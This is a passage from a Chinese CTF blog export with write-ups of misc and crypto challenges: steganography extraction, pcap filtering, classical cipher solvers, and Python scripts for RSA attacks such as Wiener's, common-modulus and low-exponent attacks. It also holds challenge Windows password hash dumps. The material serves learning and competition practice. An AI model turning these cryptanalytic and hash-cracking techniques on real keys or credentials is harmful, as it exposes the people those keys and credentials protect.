&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;4.pngExifTool Version Number : 12.07File Name : 4.pngDirectory : &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steadyFile Size : 63 kBFile Modification Date&#x2F;Time : 2019:10:19 18:50:30+08:00File Access Date&#x2F;Time : 2020:11:05 21:06:05+08:00File Inode Change Date&#x2F;Time : 2020:11:05 21:06:05+08:00File Permissions : rw-------File Type : PNGFile Type Extension : pngMIME Type : image&#x2F;pngImage Width : 145Image Height : 263Bit Depth : 8Color Type : RGBCompression : Deflate&#x2F;InflateFilter : AdaptiveInterlace : NoninterlacedPixels Per Unit X : 2835Pixels Per Unit Y : 2835Pixel Units : metersWarning : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)Artist : another part:cExlX1BsYImage Size : 145x263Megapixels : 0.038 第五张图片。 strings 15.png &#x3D;&gt; Yzcllfc0lN Business Planning Groupbpg图片，直接搜索PNG尾部42 60 82，接下来是bpg的头部，截取下来。使用Honeyview，打开。 打开之后拿到base64解码，拿到flag。 我爱Linuxpython序列化 123456789import pickle fp &#x3D; open(&quot;2.txt&quot;,&quot;rb+&quot;) &#39;&#39;&#39; 打开序列化文件 &#39;&#39;&#39;fw &#x3D; open(&#39;pickle.txt&#39;, &#39;w&#39;) &#39;&#39;&#39; 打开保存文件 &#39;&#39;&#39;a&#x3D;pickle.load(fp) &#39;&#39;&#39; 反序列化文件编译 &#39;&#39;&#39;pickle&#x3D;str(a) &#39;&#39;&#39; 转换成字符串要不然不能保存 &#39;&#39;&#39;fw.write( pickle ) &#39;&#39;&#39; 写入文件 &#39;&#39;&#39;fw.close() &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;fp.close() &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39; 第一个是坐标，第二个是内容。画图。 1234567891011121314151617181920212223242526272829303132fw = open(&quot;pickle.txt&quot;,&quot;r&quot;)text=fw.read( )i=0a=0while i&lt;len(text)+1: if(text[i]==&#x27;]&#x27;): print(&#x27;\\n&#x27;) a=0 elif(text[i]==&#x27;(&#x27;): if(text[i+2]==&#x27;,&#x27;): b=text[i+1] d=text[i+1] b=int(b)-int(a) c=1 while c&lt;b: print(&quot; &quot;, end=&quot;&quot;) c += 1 print(text[i+5], end=&quot;&quot;) a=int(d) else: b=text[i+1]+text[i+2] d=text[i+1]+text[i+2] b=int(b)-int(a) c=1 while c&lt;b: print(&quot; &quot;, end=&quot;&quot;) c += 1 print(text[i+6], end=&quot;&quot;) a=int(d) i +=1 [GUET-CTF2019]soul sipse一个音频，打开之后没有发现什么东西。尝试binwalk。分离不出东西。尝试隐写。 123steady@steady:~/桌面/steady$ steghide extract -sf out.wavEnter passphrase: wrote extracted data to &quot;download.txt&quot;. 拿到一个下载链接。 1https:&#x2F;&#x2F;share.weiyun.com&#x2F;5wVTIN3 一个PNG文件，修复头部，图片是unicode，编码使用小红帽编码。 [BSidesSF2019]diskimage12root@root:&#x2F;tmp# zsteg &#39;&#x2F;tmp&#x2F;attachment (1).png&#39; --allb8,rgb,lsb,xy .. file: DOS&#x2F;MBR boot sector, code offset 0x3c+2, OEM-ID &quot;~mitsumi&quot;, root entries 224, sectors 2880 (volumes &lt;&#x3D;32 MB) , sectors&#x2F;FAT 9, sectors&#x2F;track 18, serial number 0x7e572f0f, unlabeled, FAT (12 bit) 导出一个fat数据。 1root@root:&#x2F;tmp# zsteg -a &#39;b8,rgb,lsb,xy&#39; &#39;&#x2F;tmp&#x2F;attachment (1).png&#39; &gt;flag.dat [V&amp;N2020 公开赛]拉胯的三条命令直接tcpdump 1234567steady@steady:~/桌面/steady$ /usr/sbin/tcpdump -n -r nmapll.pcapng &#x27;tcp[13] = 18&#x27; | awk &#x27;&#123;print $3&#125;&#x27;| sort -ureading from file nmapll.pcapng, link-type EN10MB (Ethernet)127.0.0.1.21127.0.0.1.22127.0.0.1.3306127.0.0.1.631127.0.0.1.801","categories":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"}]},{"title":"CTF-Crypto刷题1","slug":"CTF-Crypto刷题1","date":"2019-05-25T18:10:16.000Z","updated":"2020-11-15T09:59:03.733Z","comments":true,"path":"2019/05/26/CTF-Crypto刷题1/","link":"","permalink":"http://s1eady.top/2019/05/26/CTF-Crypto%E5%88%B7%E9%A2%981/","excerpt":"","text":"BUUCTF-CryptoMD5 直接解密得到admin1 url编码 1%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d 解码得到flag 一眼就解密 下面的字符串解密后便能获得flag：ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= 注意：得到的 flag 请包上 flag{} 提交 base64解码 看我回旋踢 synt{5pq1004q-86n5-46q8-o720-oro5on0417r1} rot13、凯撒尝试尝试一下 1234567891011121314151617181920212223steady_dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;steady_dic1=&quot;abcdefghijklmnopqrstuvwxyz&quot;print(steady_dic1)steady_str=&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;steady_flag=&quot;&quot;steady_num=13num=0for i in steady_str: if ord(&#x27;a&#x27;) &lt;= ord(i) and ord(i) &lt;= ord(&#x27;z&#x27;): num=steady_dic1.index(i)+1+steady_num if num &gt; 26: num=num%26 print(num) steady_flag+=steady_dic1[num-1] elif ord(&#x27;A&#x27;) &lt;= ord(i) and ord(i) &lt;= ord(&#x27;Z&#x27;): num=steady_dic.index(i)+1+steady_num if num &gt; 26: num=num%26 print(num) steady_flag+=steady_dic[num-1] else: steady_flag+=iprint(steady_flag) [BJDCTF 2nd]签到-y1ngwelcome to BJDCTF1079822948 1QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ&#x3D;&#x3D; base64编码 password姓名：张三生日：19900315 key格式为key{xxxxxxxxxx} 变异凯撒1afZ_r9VYfScOeO_UL^RWUc 每一个字符的唯一不一样，第一个位移为5，依次加一。 12345678steady_str=&quot;afZ_r9VYfScOeO_UL^RWUc&quot;start=5flag=&quot;&quot;for i in range(len(steady_str)): print(steady_str[i]) flag+=chr(ord(steady_str[i])+start) start+=1print(flag) Quoted-printable1&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6 直接解密 1那你也很棒哦 RabbitRabbit解密，有些时候需要密钥。此编码与和base64很相似。 1U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI 篱笆墙的影子1felhaagv&#123;ewtehtehfilnakgw&#125; 篱笆==栅栏 丢失的md5直接跑出md5 123456789import hashlib for i in range(32,127): for j in range(32,127): for k in range(32,127): m=hashlib.md5() m.update(&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27;) des=m.hexdigest() if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des: print des Alice与Bob分解 123456from factordb.factordb import FactorDBN=98554799767factor=FactorDB(N)factor.connect()factor_list=factor.get_factor_list()print(factor_list) 进行md5加密。 rsarsa常规脚本 1234567891011import gmpy2flag=&quot;&quot;p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034n=q*pphin = (p - 1) * (q - 1)d=gmpy2.invert(e, phin)m=pow(int(c),d,n)print(m) RSA直接求d 12345678910import gmpy2flag&#x3D;&quot;&quot;p &#x3D; 473398607161q &#x3D; 4511491e &#x3D; 17c &#x3D; 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034n&#x3D;q*pphin &#x3D; (p - 1) * (q - 1)d&#x3D;gmpy2.invert(e, phin)print(d) 大帝的密码武器公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。以下密文被解开后可以获得一个有意义的单词：FRPHEVGL你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。 ComeChina Windows系统密码1234Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56::: a7fcb22a88038f35a8f39d503e7f0062md5解密。 燕言燕语十六进制解密 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647def hex_to_str(): while True: s = input(&quot;输入要转成字符串的16进制(输入空字符串退出)：&quot;) if s==&#x27;&#x27;: break k=&#x27;&#x27; try: for i in range(0,len(s),2): j = s[i]+s[i+1] k+=chr(int(j,16)) print(k) except Exception as err: print(&quot;输入有误：&quot;,end=&quot;&quot;) print(err)def str_to_hex(): while True: s = input(&quot;输入要转成16进制的字符串(输入空字符串退出)：&quot;) if s==&#x27;&#x27;: break k=&#x27;&#x27; for i in s: k+=str(hex(ord(i))) k= k.replace(&quot;0x&quot;,&quot;&quot;) print(k)def main(): print(&#x27;&#x27;&#x27;****************************************** 1.字符串转16进制 ** 2.16进制转字符串 ****************************************** &#x27;&#x27;&#x27;) while True: k = input(&quot;请输入要使用功能的序号：&quot;) if k==&#x27;1&#x27;: str_to_hex() break if k==&#x27;2&#x27;: hex_to_str() break else: print(&quot;输入有误请重新输入！！！&quot;) if __name__==&quot;__main__&quot;: main() 1yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; 发现flag不对，前面有一个yanzi，应该是个密钥，尝试维吉尼亚解密。 传统知识+古典密码根据甲子表，拿到对应的asciiXZSDMFLZ，然后栅栏，拿到四栅栅栏，进行凯撒解密，拿到flag。 [GKCTF2020]小学生的密码学e(x)=11x+6(mod26) 密文：welcylk flag为base64形式 仿设加密 123456789import string #affineimport base64 s = &#x27;welcylk&#x27;s1 = &#x27;&#x27;len =len(s)for i in range(0,len): a=(19*(ord(s[i])-97-6))%26 s1+=chr(a+97)print(base64.b64encode(s1)) RSA1123456789101112131415import gmpy2 from Crypto.Util.number import long_to_bytes c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 InvQ=gmpy2.invert(q,p) mp=pow(c,dp,p) mq=pow(c,dq,q) m=(((mp-mq)*InvQ)%p)*q+mq print long_to_bytes(m) 权限获得第一步Administrator:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:1 windows密码，倒数第二个数值是密码，尝试md5解密。 萌萌哒的八戒提示八戒，一看就是猪圈密码。 RSA312345678910111213141516from gmpy2 import *import libnumn = 22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1 = 11187289e2 = 9647291s = gcdext(e1, e2)s1 = s[1]s2 = -s[2]c1 = 22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361c2 = 18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397c2 = invert(c2, n)m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % nprint libnum.n2s(m) 异性相吸异或 123456steady_str&#x3D;&quot;asadsasdasdasdasdasdasdasdasdasdqwesqf&quot;f&#x3D;open(&quot;&#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;1&#x2F;密文.txt&quot;,&quot;r&quot;).read()flag&#x3D;&quot;&quot;for i in range(0,len(steady_str)): flag+&#x3D;chr(ord(steady_str[i])^ord(f[i]))print(flag) RSA拿到public.key，使用openssl 12345678910111213OpenSSL&gt; rsa -pubin -text -modulus -in &#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;0eaf8d6c-3fe5-4549-9e81-94ac42535e7b&#x2F;pub.keyPublic-Key: (256 bit)Modulus: 00:c0:33:2c:5c:64:ae:47:18:2f:6c:1c:87:6d:42: 33:69:10:54:5a:58:f7:ee:fe:fc:0b:ca:af:5a:f3: 41:cc:ddExponent: 65537 (0x10001)Modulus&#x3D;C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+&#x2F;AvKr1rzQczdAgMBAAE&#x3D;-----END PUBLIC KEY----- e=65537 n=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD 123456789101112131415import libnum from Crypto.Util.number import long_to_bytes n = 86934482296048119190666062003494800588905656017203025617216654058378322103517 p = 285960468890451637935629440372639283459 q = 304008741604601924494328155975272418463e = 65537 phi = (p-1)*(q-1) d = libnum.invmod(e,phi) with open(&#x27;/Users/apple/Desktop/flag.enc&#x27;) as f: c = f.read().encode(&#x27;hex&#x27;) c = int(c,16) m = pow(c,d,n) print long_to_bytes(m) GKCTF2020]汉字的秘密当铺密码 123456789101112131415x = &#x27;田口由中人工大土士王夫井羊壮&#x27;y = &#x27;00123455567899&#x27;z = &#x27;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&#x27;s = &#x27;&#x27;for i in z: if i in x: s += y[x.index(i)] else: s += &#x27; &#x27;ll = s.split(&quot; &quot;)t = &#x27;&#x27;for i in range(0,len(ll)): t += chr(int(ll[i]) + i + 1)print(t.lower()) RSAROLL12345678910111213import gmpy2flag=&quot;&quot;e=19q=18443p=49891n=920139713phin = (p - 1) * (q - 1)d=gmpy2.invert(e, phin)f=open(&#x27;/Users/apple/Desktop/data.txt&#x27;,&#x27;r&#x27;)for i in f.readlines(): m=pow(int(i),d,n) flag+=chr(m)print(flag) Dangerous RSA1234#n: 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L#e: 0x3#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365so,how to get the message? 123456789101112131415161718import gmpy2import binasciiimport libnumimport timefrom Crypto.Util.number import long_to_bytesn=0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793e=3 res=0c=0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365 print time.asctime() for k in xrange(200000000): if gmpy2.iroot(c+n*k,3)[1]==1: res=gmpy2.iroot(c+n*k,3)[0] print k,res print long_to_bytes(res) print time.asctime() break Cipher1还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag&#123;&#125; 提交, flag&#123;小写字母&#125; playfair密码。 123from pycipher import Playfaira&#x3D;Playfair(&#39;playfirbcdeghkmnoqstuvwx&#39;).decipher(&#39;Dncnoqqfliqrpgeklwmppu&#39;)print(a) 在线网站==http://rumkin.com/tools/cipher/playfair.php。 [AFCTF2018]Morse莫斯密码解密-十六进制转换字符串。 [HDCTF2019]basic rsa1234567891011121314import gmpy2from Crypto.Util.number import *p=262248800182277040650192055439906580479q=262854994239322828547925595487519915551e=65533n=p*qc=27565231154623519221597938803435789010285480123476977081867877272451638645710phi=(p-1)*(q-1)d=int(gmpy2.invert(e,phi))m=pow(c,d,n)print(long_to_bytes(m)) 达芬奇密码12达芬奇隐藏在蒙娜丽莎中的数字列:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 记录在达芬奇窗台口的神秘数字串:36968853882116725547342176952286 第零位1还是1，没有位移。 第一位233是斐波那契数列的第十二位（以0开始算），因此下面神秘数字串的第一位的6是原本flag的第十二位。 第二位3是斐波那契数列的第三位，因此下面神秘数字串的第二位的9是原本flag的第三位。 12345678910111213141516171819#主要思路是遍历fakefibbo，然后找出对应哪一位，如fb中第二个数对应rb中第五个#然后cipher对应fakebibbo,因此cipher中第二个数对应flag第五个数#因此有reslut[4]=cipher[1],依次类推realfibbo = &#x27;1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309&#x27;fakefibbo = &#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&#x27;cipher = &#x27;36968853882116725547342176952286&#x27;realfibbo = realfibbo.split(&#x27; &#x27;)fakefibbo = fakefibbo.split(&#x27; &#x27;)result = [&#x27;a&#x27;]*32for i in range(len(cipher)):#这里要考虑到第二个1(fb[24])寻找的时候，会找到1123中第一个数，也就是index=0，而我们希望他找到第二个数，也就是index=1 if(i == 24): index = 1 else: index = realfibbo.index(fakefibbo[i]) result[index] = cipher[i]for i in result: print(i,end=&#x27;&#x27;)##37995588256861228614165223347687[Finished in 0.2s] rsa2求出d即可。 12345N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085import hashlibflag = &quot;flag&#123;&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;&#125;&quot;print(flag) e太大尝试低解密指数攻击。 12345678910111213141516171819202122232425262728import gmpy2from Crypto.PublicKey import RSAimport ContinuedFractions, Arithmeticfrom Crypto.Util.number import long_to_bytes def wiener_hack(e, n): # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git ! frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(&quot;Hacked!&quot;) return d return Falsedef main(): n = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471 e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085 c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192 d = wiener_hack(e, n) print(d)if __name__==&quot;__main__&quot;: main() [GXYCTF2019]CheckIndikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==尝试base64解密 v)*L*_F0&lt;&#125;@H0&gt;F49023@FE0#@EN,rot47解密，拿到flag。 RSA5通过对不同的n进行gcd()算法，求出最大公约数，（即p）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from gmpy2 import *n1 = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207c1 = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320n2 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759c2 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855n3 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491c3 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862n4 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751c4 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613n5 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067c5 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357n6 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369c6 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932n7 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137c7 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179n8 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191c8 = 